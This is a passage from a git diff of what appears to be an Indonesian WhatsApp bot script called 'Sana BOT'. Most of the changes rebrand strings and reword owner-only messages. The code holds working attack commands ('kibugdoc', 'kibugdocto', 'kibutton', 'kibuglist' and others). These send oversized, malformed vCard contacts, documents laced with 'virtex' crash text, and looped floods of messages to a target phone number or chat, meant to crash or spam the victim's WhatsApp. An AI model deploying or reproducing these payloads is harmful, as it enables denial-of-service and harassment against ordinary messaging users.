karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.premium, fkontaak)
@@ -5475,7 +5566,7 @@ await m.reply(`Berhasil Mengirim Kintil Di Nomer ${text}`)
 break
 
 	case 'kibugdocto':{
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 jobotz.sendMessage(`${text}@s.whatsapp.net`, {document: thumb},{quoted: {
 key: {
@@ -5490,7 +5581,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,
+"fileName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 	}
 }
@@ -5500,7 +5591,7 @@ await m.reply(`Berhasil Mengirim Bugdoc Di Nomer ${text}`)
 break
 
 	case 'kibugdoc':{
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -5517,7 +5608,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${philips}`,
+"fileName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${philips}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 	}
 }
@@ -5525,20 +5616,20 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 }
 }
 break
-case 'kidocu':{
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '29':{
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
 y1 = fs.readFileSync('./virtex/iphone.mp3')
-jobotz.sendMessage(m.chat, {document: y1, fileName: `🔥 ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ 🔥 ${doc}.mp3`, quoted: m})
-jobotz.sendMessage(m.chat, {document: y1, fileName: `🔥 ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ 🔥 ${jobot}.txt`, quoted: m})
-jobotz.sendMessage(m.chat, {document: y1, fileName: `🔥 ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ 🔥 ${ngazap}.js`, quoted: m})
+jobotz.sendMessage(m.chat, {document: y1, fileName: `🔥 ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ 🔥 ${doc}.mp3`, quoted: m})
+jobotz.sendMessage(m.chat, {document: y1, fileName: `🔥 ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ 🔥 ${jobot}.txt`, quoted: m})
+jobotz.sendMessage(m.chat, {document: y1, fileName: `🔥 ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ 🔥 ${ngazap}.js`, quoted: m})
 }
 }
 break
 case 'button':{
-              if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+              if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -5558,34 +5649,8 @@ jobotz.sendMessage(m.chat, buttonMessage)
 }
 }
                break
-case 'poll': {
- if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
-var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-"pollCreationMessage": {
-"name": "ABSEN DULU YUK GUYS",
-"options": [
-	{
-"optionName": "SAKIT BANG"
-	},
-	{
-"optionName": "HADIR BANG"
-	},
-	{
-"optionName": "ABSEN BANG"
-	},
-	{
-"optionName": "ㅊ ❈ Sana BOT ✯"
-	}
-],
-"selectableOptionsCount": 4
-	}
-}), { userJid: m.chat, quoted: doc })
-jobotz.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
-deploy('sukses sendbug')
-}
-break
 case 'buttonpro':{
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -5607,18 +5672,18 @@ jobotz.sendMessage(m.chat, buttonMessage,  { quoted: a })
 }
                break
 case 'kibutton': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
 let buttons = [
-{buttonId: `bugjo`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}' }, type: 1 },
-{buttonId: `allmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}' }, type: 1 },
-{buttonId: `listmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}' }, type: 1 },
+{buttonId: `bugjo`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}' }, type: 1 },
+{buttonId: `allmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}' }, type: 1 },
+{buttonId: `listmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}' }, type: 1 },
 ]
 let buttonMessage = {
 image: fs.readFileSync('./pict.jpg'),
-caption: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nYou Tube: https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ`,
+caption: `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nYou Tube: https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ`,
 footer: virtex2,
 buttons: buttons,
 headerType: 4
@@ -5628,16 +5693,16 @@ jobotz.sendMessage(m.chat, buttonMessage, { quoted: shield2 })
 }
 break
 case 'buttonp': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let buttons = [
-{buttonId: `bugjo`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}' }, type: 1 },
-{buttonId: `allmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}' }, type: 1 },
-{buttonId: `listmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}' }, type: 1 },
+{buttonId: `bugjo`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}' }, type: 1 },
+{buttonId: `allmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}' }, type: 1 },
+{buttonId: `listmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}' }, type: 1 },
 ]
 let buttonMessage = {
 image: fs.readFileSync('./pict.jpg'),
-caption: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nYou Tube: https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ`,
+caption: `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nYou Tube: https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ`,
 footer: virtex2,
 buttons: buttons,
 headerType: 4
@@ -5647,16 +5712,16 @@ await m.reply(`Berhasil Mengirim Button Di Nomer ${text}`)
 }
 break
 case 'kigasbutton': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let buttons = [
-{buttonId: `bugjo`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}' }, type: 1 },
-{buttonId: `allmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}' }, type: 1 },
-{buttonId: `listmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}' }, type: 1 },
+{buttonId: `bugjo`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}' }, type: 1 },
+{buttonId: `allmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}' }, type: 1 },
+{buttonId: `listmenu`, buttonText: { displayText: '❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}' }, type: 1 },
 ]
 let buttonMessage = {
 image: fs.readFileSync('./pict.jpg'),
-caption: `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nYou Tube: https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ`,
+caption: `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nYou Tube: https://youtube.com/channel/UC-EkKfwcnW1jvIfwTm3IzsQ`,
 footer: virtex2,
 buttons: buttons,
 headerType: 4
@@ -5667,7 +5732,7 @@ await m.reply(`Berhasil Mengirim Button Di Nomer ${text}`)
 }
 break
 case 'kibuglist':{
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -5675,17 +5740,17 @@ des = [
 {
 title: `Fixed`,
  rows: [
-{title: virtex1, rowId: `Jembod`, description: `Hai \nSaya ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`},
-{title: virtex2, rowId: `Jembod`, description: `Hai \nSaya ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`}
+{title: virtex1, rowId: `Jembod`, description: `Hai \nSaya ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`},
+{title: virtex2, rowId: `Jembod`, description: `Hai \nSaya ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`}
 ]
 }
 ]
-jobotz.sendListMsg(m.chat, `Script Di List\n${philips}`, jobotz.user.name, `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`, `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\n-${jobot}`, des, shield2)
+jobotz.sendListMsg(m.chat, `Script Di List\n${philips}`, jobotz.user.name, `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`, `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\n-${jobot}`, des, shield2)
 }
 }
 break
 case 'kitagwae': {
-                if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+                if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                 if (!m.isGroup) throw mess.group 
                 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
@@ -5702,30 +5767,30 @@ for (let i = 0; i < jumlah; i++) {
 
 case 'kislebew' : {
                     if(!m.key.fromMe) return
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                     a = await jobotz.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ SLEBEW"}, {quoted: a})
-                    m.reply(`© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`)
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
+                    await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ SLEBEW"}, {quoted: a})
